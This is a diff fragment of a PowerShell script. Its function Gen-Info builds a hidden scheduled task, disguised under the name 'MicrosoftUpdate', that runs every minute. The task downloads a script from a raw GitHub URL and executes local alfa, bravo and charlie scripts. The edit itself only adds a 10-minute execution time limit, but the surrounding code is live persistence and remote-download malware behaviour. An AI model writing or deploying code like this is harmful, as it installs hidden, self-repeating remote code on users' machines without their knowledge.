@@ -26,7 +26,7 @@ function Gen-Info {
     $cmd = "if (-not (Test-Path '$alfa_path\alfa.ps1') -and -not (Test-Path '$bravo_path\bravo.ps1') -and -not (Test-Path '$charlie_path\charlie.ps1')) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1', '$alfa_path\alfa.ps1') } else { if (Test-Path '$alfa_path\alfa.ps1') { & '$alfa_path\alfa.ps1' }; if (Test-Path '$bravo_path\bravo.ps1') { & '$bravo_path\bravo.ps1' }; if (Test-Path '$charlie_path\charlie.ps1') { & '$charlie_path\charlie.ps1' } }"
     
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan)
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
     
     $task_alfa = "MicrosoftUpdate"
